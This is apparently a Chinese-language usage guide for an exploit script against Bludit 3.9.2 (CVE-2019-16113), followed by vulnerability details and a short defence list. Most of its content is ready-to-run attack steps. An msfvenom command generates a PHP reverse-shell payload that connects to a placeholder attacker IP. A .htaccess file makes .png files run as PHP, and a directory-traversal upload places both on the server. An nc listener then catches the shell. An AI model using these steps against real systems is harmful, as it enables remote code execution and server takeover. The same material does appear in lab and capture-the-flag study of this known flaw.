漏洞利用方法

    - 利用目录遍历漏洞将文件上传到可执行目录

## 使用说明

1. **准备工作**：
   - 生成恶意payload：`msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=YOUR_PORT -f raw -b '\"' > evil.png`
   - 添加PHP标记：`echo -e "<?php $(cat evil.png)" > evil.png`
   - 创建.htaccess文件：`echo "RewriteEngine off" > .htaccess && echo "AddType application/x-httpd-php .png" >> .htaccess`

2. **配置参数**：
   - 修改脚本中的`url`为目标Bludit地址
   - 修改`username`和`password`为管理员凭据
   - 确保`payload`和`payload2`变量指向正确的文件路径

3. **执行攻击**：
   - 运行Python脚本：`python3 exploit.py`
   - 启动监听器：`nc -nlvp 53`（或其他指定端口）
   - 访问恶意文件：`http://target/bl-content/tmp/temp/evil.png`

## 漏洞详情

- **CVE ID**: CVE-2019-16113
- **CVSS评分**: 8.8 (HIGH)
- **CVSS向量**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
- **CWE**: CWE-22 (路径遍历)
- **影响版本**: Bludit 3.9.2

## 技术原理

该漏洞存在于`bl-kernel/ajax/upload-images.php`文件中，攻击者可以通过目录遍历（`../../tmp/temp`）将恶意文件上传到可执行目录。结合.htaccess文件将.png文件当作PHP执行，从而实现远程代码执行。

## 防御建议

1. 升级到Bludit最新版本
2. 实施严格的文件上传验证
3. 禁用不必要的文件上传功能
4. 定期审查服务器文件权限
5. 实施Web应用防火墙规则
